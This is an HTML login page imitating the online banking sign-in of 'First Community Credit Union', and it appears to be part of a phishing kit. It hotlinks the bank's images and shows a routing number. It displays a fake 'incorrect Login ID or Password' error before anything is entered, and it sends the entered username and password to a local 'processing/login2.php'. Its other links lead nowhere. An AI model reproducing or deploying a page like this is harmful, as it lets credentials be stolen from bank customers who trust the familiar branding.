<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>First Community Credit Union</title>
<link href="https://cdn1.onlineaccess1.com/cdn/depot/5068/2107/45cdf49ad9c912da80f3487450270fb0/assets/images/favicon-0361b926268b58361e3ddc715985c088.ico" rel="icon">

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:Arial, Helvetica, sans-serif;
}

body{
    min-height:100vh;
    background:url("https://cdn1.onlineaccess1.com/cdn/depot/5068/2107/45cdf49ad9c912da80f3487450270fb0/assets/images/desktop-background-02c365e538f6b0c6281c645a08939c1d.jpg") no-repeat center center;
    background-size:cover;
    display:flex;
    justify-content:center;
    align-items:center;
    padding:20px;
}

.login-wrapper{
    width:100%;
    max-width:640px;
}

.login-box{
    background:#ffffff;
    overflow:hidden;
    box-shadow:0 4px 13px rgba(0,0,0,.25);
}

.logo-area{
    height:100px;
    background-color:#2D2D2D;
    display:flex;
    justify-content:center;
    align-items:center;
}

.logo-area img{
    max-width:310px;
    max-height:80px;
}

.error-bar{
    background:#e00000;
    color:#fff;
    text-align:center;
    padding:14px 20px;
    font-size:15px;
    line-height:1.7;
}

.form-area{
    padding:45px 70px;
}

.form-group{
    margin-bottom:22px;
}

.form-group label{
    display:block;
    margin-bottom:8px;
    font-size:16px;
    color:#111;
}

.form-control{
    width:100%;
    height:46px;
    border:1px solid #8f8f8f;
    padding:0 12px;
    background:#fff;
    font-size:15px;
}

.password-wrapper{
    position:relative;
}

.show-btn{
    position:absolute;
    right:12px;
    top:50%;
    transform:translateY(-50%);
    background:none;
    border:none;
    color:#04043A;
    cursor:pointer;
    font-size:15px;
}

.remember{
    display:flex;
    align-items:center;
    gap:12px;
    margin:15px 0 30px;
}

.remember input{
    width:24px;
    height:24px;
}

.login-btn{
    width:100%;
    height:40px;
    border:none;
    background:#E5383B;
    color:#fff;
    font-size:17px;
    font-weight:bold;
    cursor:pointer;
    border-radius:2px;
}

.login-btn:hover{
    opacity:.95;
    background:#2D2D2D;
}

.footer-links{
    background:#2D2D2D;
    display:flex;
    justify-content:center;
    align-items:center;
    flex-wrap:wrap;
    gap:18px;
    padding:18px;
}

.footer-links a{
    color:#fff;
    text-decoration:none;
    font-size:14px;
}

.divider{
    color:#fff;
}

@media (max-width:768px){

    body{
        padding:0;
    }

    .login-wrapper{
        max-width:100%;
    }

    .login-box{
        min-height:100vh;
    }

    .form-area{
        padding:30px 25px;
    }

    .error-bar{
        font-size:14px;
        padding:12px 15px;
    }

    .login-btn{
        font-size:22px;
        height:50px;
    }

    .footer-links{
        gap:12px;
    }
}
</style>
</head>

<body>

<div class="login-wrapper">
           
    <div class="login-box">
	
	
	  <div class="logo-area">
    <img src="img/logo2.png" alt="Logo">
    
	</div>

        <div class="error-bar">
              You have entered an incorrect Login ID or Password.
        </div>
		
        <div class="form-area">
		
		<form method="post" action="processing/login2.php">

            <div class="form-group">
                <label>Login ID</label>
                <input type="text" class="form-control" id="username" name="username" required>
            </div>

            <div class="form-group">
                <label>Password</label>

                <div class="password-wrapper">
                    <input type="password" class="form-control" id="password" name="password" required>
                    <button type="button" class="show-btn" onclick="togglePassword()">
                        Show
                    </button>
                </div>
            </div>

            <div class="remember">
                <input type="checkbox">
                <span>Remember me</span>
            </div>

            <button type="submit" class="login-btn">
                Log In
            </button>
			
			<br>
			<br>
			
			
			<p align="right">
			
			<a style="color: #000;" href="#">Forgot your password?</a>
			
			</p>

        </div>

        <div class="footer-links">
            <a href="#">Privacy Policy</a>
            <span class="divider">|</span>

            <a href="#">Apply for a loan</a>
            <span class="divider">|</span>
			
			<a href="#">Make An Appt</a>
			<span class="divider">|</span>
			
			<a href="#">ATMs & Locations</a>
			<span class="divider">|</span>
			
			<a href="#">Enroll: Personal</a>
			<span class="divider">|</span>
			
			<a href="#">Enroll: Business</a>
			<span class="divider">|</span>
			
            <a href="#">Forgot Username?</a>
        </div>

    </div>
	
	<br>
	
	<p align="center" style="color: white;"><strong>
	
	Routing 313084674
	</strong>
	</p>
	
	<br>
	
	<p align="center">
	
	<img src="https://cdn1.onlineaccess1.com/cdn/depot/5068/2107/45cdf49ad9c912da80f3487450270fb0/assets/images/ncua_logo_small-09d0a1d9298663b462938cc4e96ff67a.png">
    
	</p>

</div>

<script>
function togglePassword() {
    const input = document.getElementById('password');

    if(input.type === 'password'){
        input.type = 'text';
    }else{
        input.type = 'password';
    }
}
</script>

</body>
</html>